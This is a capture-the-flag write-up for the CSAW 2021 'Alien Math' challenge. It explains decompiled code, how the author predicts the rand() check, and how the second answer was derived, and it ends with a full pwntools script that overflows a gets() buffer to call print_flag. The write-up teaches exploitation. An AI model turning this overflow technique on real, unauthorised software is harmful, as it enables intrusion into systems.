The goal of this challenge is to call the print_flag function which opens the flag.txt file on the remote server. In order to call the print_flag function you have to answer two questions correctly to get to the vulnerable `gets` function in `final_question`.
While the first and second questions do not have b0f vulnerable functions they have poor implementations of rand() that enable you to bypass the checks in order to get to the vulnerable function.

Main takes user input from `__isoc99_scanf` and string formats it to a decimal number. Then `rand()` is called with a default seed and compared against the user input. This is not a secure function and can is easily predicted. This funciton will always return the same result on the first iteration based on your version of libc if given a default seed. Since we have to bypass this check we have two options; to either have python generate the value or pull it from memory. I chose to pull the value from GDB.

`b *main+103` to stop at ` 0x00000000004015f5 <+103>:	cmp    QWORD PTR [rbp-0x8],rax`

`$rax` is compared to `$rbp-0x8` so we examine this offset on the stack: `x/gx $rbp-0x8` and we get `0x7fffffffdcf8:	0x000000006b8b4567` or 1804289383 in decimal.

           
     
```c
int main(void)

{
  int tmp_rand;
  char q2_buf [36];
  int q1_buf;
  long val_rand;
  
  puts("\n==== Flirbgarple Math Pop Quiz ====");
  puts("=== Make an A to receive a flag! ===\n");
  puts("What is the square root of zopnol?");
  fflush(stdout);
  __isoc99_scanf(" %d",&q1_buf);
  tmp_rand = rand();
  val_rand = (long)tmp_rand;
  if (val_rand == q1_buf) {
    puts("Correct!\n");
    fflush(stdout);
    getchar();
    puts("How many tewgrunbs are in a qorbnorbf?");
    fflush(stdout);
    __isoc99_scanf("%24s",q2_buf);
    second_question(q2_buf);
  }
  else {
    puts("Incorrect. That\'s an F for you!");
  }
  return 0;
}
```

After this `__isoc99_scanf` is called again and our input is formated to a max of 24 characters as a string. Our input is then put passed into the `second_question` function

Next some funky values are placed on the stack and our input is sent through a convulated transformation. 
```c
void second_question(char *user_input)

{
  int y;
  size_t len_var_to_match;
  ulong uVar1;
  undefined8 var_to_match;
  undefined8 unused1;
  undefined8 unused2;
  int index;
  char x;
  
  index = 0;
  while( true ) {
    uVar1 = SEXT48(index);
    len_var_to_match = strlen(user_input);
    if (len_var_to_match - 1 <= uVar1) {
      var_to_match = 3762247539570849591;
      unused1 = 0x3332333535323538;
      unused2 = 0x353232393232;
      len_var_to_match = strlen((char *)&var_to_match);
      y = strncmp((char *)&var_to_match,user_input,len_var_to_match);
      if (y == 0) {
        puts("Genius! One question left...\n");
        final_question();
        puts("Not quite. Double check your calculations.\nYou made a B. So close!\n");
      }
      else {
        puts("You get a C. No flag this time.\n");
      }
      return;
    }
    if ((user_input[index] < '0') || ('9' < user_input[index])) break;
    x = user_input[(long)index + 1];
    y = second_question_function((int)user_input[index],user_input[index] + index);
    y = x + -48 + y;
    user_input[(long)index + 1] = (char)y + (char)(y / 10) * -10 + '0';
    index = index + 1;
  }
  puts("Xolplsmorp! Invalid input!\n");
  puts("You get a C. No flag this time.\n");
  return;
}
```
The transformation is compared against a static value of 7759406485255323229225. We can pull this value from memory:

`b *second_question+358` then give some input and continue and `x/gx $rdi` which yields 7759406485255323229225.

Again we have two options; we can either model the function in python and use [Microsoft's z3 utilities to create the acceptable input](https://github.com/CR15PR/CSAW2021/blob/main/pwn/Alien_math/z3_Solver.py) or [brute force the key](https://github.com/CR15PR/CSAW2021/blob/main/pwn/Alien_math/brute_force.py) character by character since the same input will always produce the same output.

User input is stored in `$rsi` so using this breakpoint you can character by character observe the changes to yield the correct result:

      7 - 7
      78 - 77
      785 - 775 
      7856 - 7759
      78564 - 77594
      785644 - 775940
      7856445 - 7759406
      78564458 - 77594064
      785644589 - 775940648
      7856445899 - 7759406485
      78564458992 - 77594064852
      785644589921 - 775940648525
      7856445899213 - 7759406485255
      78564458992130 - 77594064852553
      785644589921306 - 775940648525532
      7856445899213065 - 7759406485255323
      78564458992130654 - 77594064852553232
      785644589921306542 - 775940648525532322
      7856445899213065428 - 7759406485255323229
      78564458992130654287 - 77594064852553232292
      785644589921306542879 - 775940648525532322922
      7856445899213065428791 - 7759406485255323229225

We can confirm our correct value again at `second_question+358`:

![pic](https://github.com/CR15PR/CSAW2021/blob/main/pwn/Alien_math/alien-math-rdi-rsi.png)

After this `final_question` is called and we find the vulnerable `gets` fucntion. This is a standard b0f that allows us to control `$rip` in order to call the `print_flag` function.

Using `! python3 -c "import pwn; print(pwn.cyclic(100, n=8))" > cyclic` we determine the offset to get a SIGSEV is 24. We use pwntools amazing abstraction ability to find the location of the print_flag symbol and pack it little endien compliant: `printFlag = p64(math_elf.symbols.print_flag)`.

We then send our [payload](https://github.com/CR15PR/CSAW2021/blob/main/pwn/Alien_math/solver.py) and get our flag.

```python
#!/usr/bin/env python3

from pwn import *

LOCAL = False
context.binary = binary = '/home/mckenziepepper/Documents/b0f-chals/CSAW/alien_math'
math_elf = ELF(binary)
context.log_level = 'debug'
printFlag = p64(math_elf.symbols.print_flag)
OFFSET = 24
junk = b"A" * OFFSET

if LOCAL == False:
    p = remote('pwn.chal.csaw.io', 5004, ssl=False)
else:
    p = process('/home/mckenziepepper/Documents/b0f-chals/CSAW/alien_math')

guess1 = b"1804289383"
p.sendlineafter("What is the square root of zopnol?", guess1)
leak = p.recvuntil("!\n")
log.info(f"{leak = }")

if b"Correct!\n" in leak:
    guess2 = b"7856445899213065428791" #------> What we want to make: 7759406485255323229225
    p.sendlineafter("How many tewgrunbs are in a qorbnorbf?", guess2)
    #leak = p.recvuntil("You get a C. No flag this time.\n") ------> Debugging purposes
    leak = p.recvuntil("Genius! One question left...\n")
    log.info(f"{leak = }")

    if b"\nGenius!" in leak:
        payload = [
            junk,
            printFlag,
        ]
        payload = b''.join(payload)
        #payload = b''.join([p64(r) for r in payload])
        p.sendline(payload)
        p.interactive()
    else:
        p.kill()
else:
    p.kill()
```

    Here is your flag: 
    flag{w3fL15n1Rx!_y0u_r34lLy4R3@_fL1rBg@rpL3_m4573R!}
